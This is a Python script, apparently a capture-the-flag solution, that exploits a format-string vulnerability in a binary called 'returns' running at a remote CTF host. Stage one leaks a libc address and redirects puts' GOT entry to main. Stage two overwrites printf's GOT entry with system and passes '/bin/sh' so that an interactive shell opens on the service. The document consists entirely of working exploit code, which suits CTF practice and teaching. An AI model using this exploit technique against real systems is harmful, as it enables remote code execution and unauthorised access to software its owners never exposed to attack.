from ptrlib import *

elf = ELF("./returns")

#libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
#diff = 0xe7
#sock = Process("./returns")

libc = ELF("./libc.so.6")
diff = 0xf0
sock = Socket("shell.actf.co", 19307)

_ = input()

# Stage 1
sock.recvuntil("What item would you like to return? ")
payload = b'%17$p...'
payload += str2bytes("%{}c%{}$hn".format(
    (elf.symbol("main") % 0xffff) - 17 - 64,
    8 + 3
))
payload += b'A' * (8 - (len(payload) % 8))
payload += p64(elf.got("puts"))[:3]
sock.sendline(payload)
sock.recvuntil("We didn't sell you a ")
addr_libc_start_main = int(sock.recvuntil(".").rstrip(b"."), 16)
libc_base = addr_libc_start_main - libc.symbol("__libc_start_main") - diff
addr_system = libc_base + libc.symbol("system")
dump("libc base = " + hex(libc_base))

# Stage 2
payload = b'/bin/sh;'
sock.recvuntil("What item would you like to return? ")
payload += str2bytes("%{}c%{}$n".format(
    (addr_system & 0xffffffff) - 8,
    12
))
payload += b'A' * (8 - (len(payload) % 8))
print(len(payload))
payload += p64(elf.got("printf"))[:3]
sock.sendline(payload)
dump(hex(addr_system))

sock.interactive()
